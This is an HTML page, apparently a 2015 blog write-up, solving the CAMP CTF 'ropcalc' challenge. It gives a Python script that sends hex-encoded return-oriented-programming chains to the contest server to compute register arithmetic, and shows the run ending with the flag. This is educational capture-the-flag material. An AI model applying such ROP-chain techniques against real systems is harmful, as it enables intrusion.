@@ -1,0 +1,502 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CAMP CTF - Ropcalc - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="How could I resist a challenge called ropcalc? We&rsquo;re given the python server and a binary. We&rsquo;re supposed to write a ROP chain to satisfy &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CAMP CTF - Ropcalc</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-18T21:35:34+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:35 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>How could I resist a challenge called ropcalc?</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given the python server and a binary. We&rsquo;re supposed to write a ROP chain to satisfy certain conditions. The server.py will then pass random values for the registers to the binary, along with the ROP chain we provide. After execution of the ROP chain, it will check if the ROP chain has calculated the right answer. Pretty nifty, if you ask me!</p>
+
+<p>The binary itself is actually packed with everything we need:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0000000000400b40 &lt;sub_rax_rbx&gt;:
+</span><span class='line'>  400b40: sub    rax,rbx
+</span><span class='line'>  400b43: ret    
+</span><span class='line'>  400b44: data32 data32 nop WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>
+</span><span class='line'>0000000000400b50 &lt;imul_rax_rbx&gt;:
+</span><span class='line'>  400b50: imul   rax,rbx
+</span><span class='line'>  400b54: ret    
+</span><span class='line'>  400b55: data32 nop WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>
+</span><span class='line'>0000000000400b60 &lt;xchg_rax_rbx&gt;:
+</span><span class='line'>  400b60: xchg   rbx,rax
+</span><span class='line'>  400b62: ret    
+</span><span class='line'>  400b63: data32 data32 data32 nop WORD PTR cs:[rax+rax*1+0x0]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The expressions we need to satisfy look like this: <code>$rax + $rbx + 1337 (store result in rax)</code></p>
+
+<p>I&rsquo;ll just give the final exploit as it&rsquo;s not that difficult:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">toHex</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="si">%02x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">payload</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10109</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop1</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">rop1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00400b30</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x004046ab</span><span class="p">)</span> <span class="c"># ret</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400900</span><span class="p">)</span> <span class="c"># pop_rcx</span>
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1337</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b80</span><span class="p">)</span> <span class="c"># add rax, rcx</span>
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b30</span><span class="p">)</span> <span class="c"># add rax, rbx</span>
+</span><span class='line'>  <span class="n">rop2</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span> <span class="c"># ret</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">rop3</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">rop3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b50</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop3</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;line:&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400900</span><span class="p">)</span> <span class="c"># pop_rcx</span>
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400f90</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b50</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop4</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop4</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># $rcx + 23 * $rax + $rbx - 42 * ($rcx - 5 * $rdx - $rdi * $rsi) - $r8 + 2015</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400a20</span><span class="p">)</span>  <span class="c"># pop r10</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">23</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400d80</span><span class="p">)</span> <span class="c"># imul rax, r10</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b80</span><span class="p">)</span> <span class="c"># add rax, rcx</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b30</span><span class="p">)</span> <span class="c"># add rax, rbx</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400cd0</span><span class="p">)</span> <span class="c"># sub rax, r8</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400a20</span><span class="p">)</span>  <span class="c"># pop r10</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">2015</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400d60</span><span class="p">)</span> <span class="c"># add rax, r10</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4020e0</span><span class="p">)</span> <span class="c"># imul rdi, rsi</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span> <span class="c"># pop r8</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401910</span><span class="p">)</span> <span class="c"># imul rdx, r8</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4018a0</span><span class="p">)</span> <span class="c"># add rdx, rdi</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401400</span><span class="p">)</span> <span class="c"># sub rcx, rdx</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4009c0</span><span class="p">)</span> <span class="c"># pop r8</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x401500</span><span class="p">)</span> <span class="c"># imul rcx, r8</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400b90</span><span class="p">)</span> <span class="c"># sub rax, rcx</span>
+</span><span class='line'>  <span class="n">rop5</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4046ab</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">toHex</span><span class="p">(</span><span class="n">rop5</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And in action:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ccc</span><span class="o">/</span><span class="n">ropc</span><span class="err">$</span> <span class="n">python</span> <span class="n">poc3</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
+</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
+</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">2</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
+</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span> <span class="o">+</span> <span class="mi">1337</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
+</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
+</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
+</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
+</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">3</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
+</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">*</span> <span class="err">$</span><span class="n">rbx</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
+</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
+</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
+</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
+</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">4</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
+</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rax</span> <span class="o">*</span> <span class="p">(</span><span class="mi">31337</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span><span class="p">)</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
+</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span>
+</span><span class='line'> <span class="n">Correct</span><span class="err">!</span>
+</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
+</span><span class='line'><span class="n">Level</span> <span class="p">[</span><span class="mi">5</span><span class="o">/</span><span class="mi">5</span><span class="p">]</span>
+</span><span class='line'><span class="n">Create</span> <span class="n">a</span> <span class="n">ROP</span> <span class="n">chain</span> <span class="n">that</span> <span class="n">calculates</span><span class="p">:</span> <span class="err">$</span><span class="n">rcx</span> <span class="o">+</span> <span class="mi">23</span> <span class="o">*</span> <span class="err">$</span><span class="n">rax</span> <span class="o">+</span> <span class="err">$</span><span class="n">rbx</span> <span class="o">-</span> <span class="mi">42</span> <span class="o">*</span> <span class="p">(</span><span class="err">$</span><span class="n">rcx</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="err">$</span><span class="n">rdx</span> <span class="o">-</span> <span class="err">$</span><span class="n">rdi</span> <span class="o">*</span> <span class="err">$</span><span class="n">rsi</span><span class="p">)</span> <span class="o">-</span> <span class="err">$</span><span class="n">r8</span> <span class="o">+</span> <span class="mi">2015</span> <span class="p">(</span><span class="n">store</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">rax</span><span class="p">)</span>
+</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span> <span class="n">Correct</span><span class="err">!</span>
+</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
+</span><span class='line'><span class="n">The</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="n">CAMP15_c0342e0be22dc032de05aa637c8ee8a3</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-08-18T21:35:34+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:35 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/08/18/camp-ctf-secret-file/" title="Previous Post: CAMP CTF - Secret_File">&laquo; CAMP CTF - Secret_File</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/08/18/camp-ctf-dkm/" title="Next Post: CAMP CTF - dkm">CAMP CTF - dkm &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-dkm/">CAMP CTF - Dkm</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-ropcalc/">CAMP CTF - Ropcalc</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-secret-file/">CAMP CTF - Secret_File</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-hacker-level/">CAMP CTF - Hacker_Level</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-bitterman-and-phobos/">CAMP CTF - Bitterman &amp; Phobos</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/08/18/camp-ctf-ropcalc/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
